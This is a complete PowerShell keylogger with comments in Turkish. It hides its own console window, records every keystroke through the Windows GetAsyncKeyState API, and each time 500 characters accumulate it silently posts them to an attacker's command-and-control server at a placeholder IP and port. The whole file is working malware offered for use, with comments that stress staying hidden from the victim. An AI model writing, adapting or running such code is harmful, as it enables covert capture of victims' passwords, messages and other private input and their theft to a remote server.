# Arka planda tamamen gizli kalması için konsol penceresini yok et
$window = Add-Type -memberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(int hWnd, int nCmdShow);
"@ -name "Win32ShowWindowAsync" -namespace Win32Functions -passThru
$window::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)

# C2 Sunucu Adresin (Arch makinenin IP'si ve Portu)
$C2_SERVER = "http://SENIN_ARCH_IP:8000/upload"

# Logların RAM'de tutulacağı değişken
$global:KeyLog = ""

# Tuşları yakalayan C# imzasını PowerShell'e yükle (API Hook)
$Signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
"@
$API = Add-Type -MemberDefinition $Signature -Name 'Keylogger' -Namespace 'Muzoovy' -PassThru

# Sonsuz döngü: Tuşları dinle
while ($true) {
    Start-Sleep -Milliseconds 40
    for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
            $key = [char]$ascii
            $global:KeyLog += $key
            
            # Eğer RAM'deki log 500 karaktere ulaştıysa, C2'ye fırlat ve RAM'i temizle
            if ($global:KeyLog.Length -ge 500) {
                try {
                    Invoke-RestMethod -Uri $C2_SERVER -Method Post -Body @{ log = $global:KeyLog } -ErrorAction SilentlyContinue
                    $global:KeyLog = "" # Upload başarılıysa hafızayı sıfırla
                } catch {}
            }
        }
    }
}